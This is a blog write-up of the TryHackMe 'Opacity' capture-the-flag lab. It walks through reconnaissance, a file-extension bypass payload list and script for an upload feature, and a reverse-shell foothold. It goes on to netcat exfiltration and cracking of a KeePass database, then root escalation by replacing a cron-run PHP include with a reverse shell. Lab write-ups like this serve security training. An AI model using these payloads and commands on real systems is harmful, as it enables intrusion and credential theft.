---
title: TryHackMe - Opacity
date: 2025-10-21 11:30:58 +01:00
categories: [Cybersecurity,CTFs]
tags: [Cybersecurity,CTFs] # TAG names should always be lowercase
---

> - Opacity is an easy machine that can help you in the penetration testing learning process.
> - There are 2 hash keys located on the machine (user - local.txt and root - proof.txt). Can you find them and become root?
> - Hint: There are several ways to perform an action; always analyze the behavior of the application.

The application starts off with a homepage that includes just a simple login form.

![](https://raw.githubusercontent.com/zared1/zared1.github.io/refs/heads/main/assets/Posts_img/CTFs/thm-opacity-homepage.png)

## Reconnaissance

```bash
$$ nmap -sC -sV  -A  -oN nmap_result 10.10.177.101
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-22 12:08 CEST
Nmap scan report for 10.10.177.101
Host is up (0.042s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0fee2910d98e8c53e64de3670c6ebee3 (RSA)
|   256 9542cdfc712799392d0049ad1be4cf0e (ECDSA)
|_  256 edfe9c94ca9c086ff25ca6cf4d3c8e5b (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-22T12:08:41
|_  start_date: N/A
|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.13 seconds
```

We notice a few ports are open, but also ran gobuster that provided some more interesting information. Because we notice it’s a PHP application, we added -x php to check for .php files as well.

```bash
$ gobuster dir -w ~/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.177.101/ -x php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.177.101/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/04/11 14:30:52 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/login.php            (Status: 200) [Size: 848]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/css                  (Status: 301) [Size: 312] [--> http://10.10.177.101/css/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/cloud                (Status: 301) [Size: 314] [--> http://10.10.177.101/cloud/]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 441071 / 441122 (99.99%)
===============================================================
2023/04/11 14:57:55 Finished
===============================================================
```
### /cloud endpoint

This endpoint provides a file upload feature. After some testing, we notice the server checks for the files extension to be an image file extension (.jpg, .png,…). We created a script to check if we can bypass this check. First, we started a python webserver to catch the incoming requests to see which ones succeed. Then we start our script that loops through different payloads, these files do not exist on the webserver but this script is merely to detect which payload provide the right output.

![](https://raw.githubusercontent.com/zared1/zared1.github.io/refs/heads/main/assets/Posts_img/CTFs/thm-opacity-cloud.png)

### File extension bypass script

#### ext_bypass.txt

```bash
cat.jpg
file1.png.php
file2.png.Php5
file3.php%20
file4.php%0a
file5.php%00
file6.php%00.jpg
file7.php#.jpg
file8.php%0d%0a
file9.php/
file10.php.\
file11.
file12.php....
file13.pHp5....
file14.png.php
file15.png.pHp5
file16.php%00.png
file17.php\x00.png
file18.php%0a.png
file19.php%0d%0a.png
file20.phpJunk123png
file21.png.jpg.php
file22.php%00.png%00.jpg
ex: file23.php.png
```
#### file_check_bypass.py

```bash
import requests
import sys
import shutil
import os

url = sys.argv[1]
attacker_ip = 'IP_HERE'
count = 0
total_lines = sum(1 for line in open('ext_bypass.txt'))
headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type':'application/x-www-form-urlencoded'}

def try_extension(extension):
    extension = extension.strip()
    payload = f'url=http%3A%2F%2F{attacker_ip}%2F{extension}'
    try:
        response = requests.post(url, headers=headers, data=payload)
        status_code=response.status_code
        print(f"{count}/{total_lines} - {status_code} - {payload}")

with open("ext_bypass.txt") as file:
    for line in file:
        count +=1
        try_extension(line)
```

Starting the script:

```bash
$ python3 file_check_bypass.py http://10.10.66.215/cloud/
1/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Fcat.jpg
2/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile1.png.php
3/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile2.png.Php5
4/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile3.php%20
5/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile4.php%0a
6/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile5.php%00
7/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile6.php%00.jpg
8/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile7.php#.jpg
9/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile8.php%0d%0a
10/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile9.php/
11/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile10.php.\
12/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile11.
13/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile12.php....
14/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile13.pHp5....
15/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile14.png.php
16/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile15.png.pHp5
17/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile16.php%00.png
18/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile17.php\x00.png
19/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile18.php%0a.png
20/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile19.php%0d%0a.png
21/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile20.phpJunk123png
22/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile21.png.jpg.php
23/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Ffile22.php%00.png%00.jpg
24/24 - 200 - url=http%3A%2F%2F10.18.11.118%2Fex: file23.php.png
```
### Server Output

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.66.215 - - [12/Apr/2023 07:25:10] code 404, message File not found
10.10.66.215 - - [12/Apr/2023 07:25:10] "GET /cat.jpg HTTP/1.1" 404 -
10.10.66.215 - - [12/Apr/2023 07:25:10] code 404, message File not found
10.10.66.215 - - [12/Apr/2023 07:25:10] "GET /file7.php HTTP/1.1" 404 -
10.10.66.215 - - [12/Apr/2023 07:25:11] code 404, message File not found
10.10.66.215 - - [12/Apr/2023 07:25:11] "GET /file17.phpx00.png HTTP/1.1" 404 -
10.10.66.215 - - [12/Apr/2023 07:25:11] code 404, message File not found
10.10.66.215 - - [12/Apr/2023 07:25:11] "GET /file18.php HTTP/1.1" 404 -
10.10.66.215 - - [12/Apr/2023 07:25:11] code 404, message File not found
10.10.66.215 - - [12/Apr/2023 07:25:11] "GET /file19.php%0D HTTP/1.1" 404 -
10.10.66.215 - - [12/Apr/2023 07:25:12] code 404, message File not found
10.10.66.215 - - [12/Apr/2023 07:25:12] "GET /ex: HTTP/1.1" 404 -
```

We noticed the 7th payload looks for a plain PHP file (GET /file7.php), we have found our payload:

```bash
url=http://10.18.11.118/file7.php#.jpg
```

## Foothold

We can now upload a reverse shell by using the above payload. Once we gained access we noticed we are the www-data account. There is one other user on this machine called sysadmin. The /home/sysadmin directory contains the local.txt flag and a scripts folder.

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.18.11.118] from (UNKNOWN) [10.10.177.101] 36966
$ whoami
www-data
$ pwd
/
$ cd /home/
$ ls
sysadmin
$ cd sysadmin   
$ ls
local.txt
scripts
```

## Lateral movement

By going through the file system, we noticed a keepass database in the /opt/ directory. We send it to our local machine through netcat and crack the password with john.

```bash
$ nc -w 3 [destination] 4444 < dataset.kdbx
```
```bash
$ nc -l -p 4444 > dataset.kdbx
$ keepass2john dataset.kdbx > Keepasshash.txt
$ cat Keepasshash.txt  
dataset:$keepass$*2*100000*0*21**REDACTED**4
$ john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
7**REDACTED**3        (dataset)     
1g 0:00:00:12 DONE (2025-10-22 16:52) 0.08077g/s 70.75p/s 70.75c/s 70.75C/s chichi..melvin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We can now use keepass2 to open the dataset.kdbx file with the master password we retrieved above. We get the credentials sysadmin:C**REDACTED**0. We can now switch accounts.

## Privilege Escalation

We notice that there is a script.php file in the /home/sysadmin/scrips/ directory, that requires the lib/backup.inc.php file. These scripts create a backup.zip of the /home/sysadmin/scrips/ directory.

```bash
$ cat script.php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
$ cat lib/backup.inc.php
<?php


ini_set('max_execution_time', 600);
ini_set('memory_limit', '1024M');


function zipData($source, $destination) {
        if (extension_loaded('zip')) {
                if (file_exists($source)) {
                        $zip = new ZipArchive();
                        if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
                                $source = realpath($source);
                                if (is_dir($source)) {
                                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                                        foreach ($files as $file) {
                                                $file = realpath($file);
                                                if (is_dir($file)) {
                                                        $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                                                } else if (is_file($file)) {
                                                        $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                                                }
                                        }
                                } else if (is_file($source)) {
                                        $zip->addFromString(basename($source), file_get_contents($source));
                                }
                        }
                        return $zip->close();
                }
        }
        return false;
}
?>
```
Looking at the /var/backups/backup.zip directory we notice that this is triggered by a cronjob that seems to be run by root and runs every few minutes.

```bash
sysadmin@opacity:~/scripts/lib$ ls -lah /var/backups/
total 92K
drwxr-xr-x  2 root root 4.0K Apr 11 17:42 .
drwxr-xr-x 14 root root 4.0K Jul 26  2022 ..
-rw-r--r--  1 root root  40K Feb 22 08:04 apt.extended_states.0
-rw-r--r--  1 root root 4.3K Jul 26  2022 apt.extended_states.1.gz
-rw-r--r--  1 root root  34K Apr 11 17:42 backup.zip
sysadmin@opacity:~/scripts/lib$ ls -lah /var/backups/
total 92K
drwxr-xr-x  2 root root 4.0K Apr 11 17:49 .
drwxr-xr-x 14 root root 4.0K Jul 26  2022 ..
-rw-r--r--  1 root root  40K Feb 22 08:04 apt.extended_states.0
-rw-r--r--  1 root root 4.3K Jul 26  2022 apt.extended_states.1.gz
-rw-r--r--  1 root root  34K Apr 11 17:49 backup.zip
```

We also notice we don’t have write permissions on the script.php or the backup.inc.php script so we can’t modify the files itself. We do have the ability to create files in the /home/sysadmin directory and to overwrite the lib/backup.inc.php file with our own modified backup.inc.php file that is a reverse shell.

```bash
sysadmin@opacity:~$ pwd
/home/sysadmin
sysadmin@opacity:~$ vi backup.inc.php
sysadmin@opacity:~$ mv backup.inc.php /home/sysadmin/scripts/lib/
mv: replace '/home/sysadmin/scripts/lib/backup.inc.php', overriding mode 0644 (rw-r--r--)? y
sysadmin@opacity:~$ ls -lah /home/sysadmin/scripts/lib/
total 136K
drwxr-xr-x 2 sysadmin root     4.0K Apr 12 05:10 .
drwxr-xr-x 3 root     root     4.0K Jul  8  2022 ..
-rw-r--r-- 1 root     root     9.3K Jul 26  2022 application.php
-rw-rw-r-- 1 sysadmin sysadmin 2.6K Apr 12 05:10 backup.inc.php
-rw-r--r-- 1 root     root      24K Jul 26  2022 bio2rdfapi.php
-rw-r--r-- 1 root     root      11K Jul 26  2022 biopax2bio2rdf.php
-rw-r--r-- 1 root     root     7.5K Jul 26  2022 dataresource.php
-rw-r--r-- 1 root     root     4.8K Jul 26  2022 dataset.php
-rw-r--r-- 1 root     root     3.2K Jul 26  2022 fileapi.php
-rw-r--r-- 1 root     root     1.3K Jul 26  2022 owlapi.php
-rw-r--r-- 1 root     root     1.5K Jul 26  2022 phplib.php
-rw-r--r-- 1 root     root      11K Jul 26  2022 rdfapi.php
-rw-r--r-- 1 root     root      17K Jul 26  2022 registry.php
-rw-r--r-- 1 root     root     6.8K Jul 26  2022 utils.php
-rwxr-xr-x 1 root     root     3.9K Jul 26  2022 xmlapi2.php
-rw-rw-r-- 1 sysadmin sysadmin   58 Apr 12 04:50 xmlapi.php
```

Our netcat listener has an incoming connection and we now have access to a root shell.

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.18.11.118] from (UNKNOWN) [10.10.66.215] 42280
root@opacity:/# whoami
root
root@opacity:/# cat /root/proof.txt
a**REDACTED**e
```
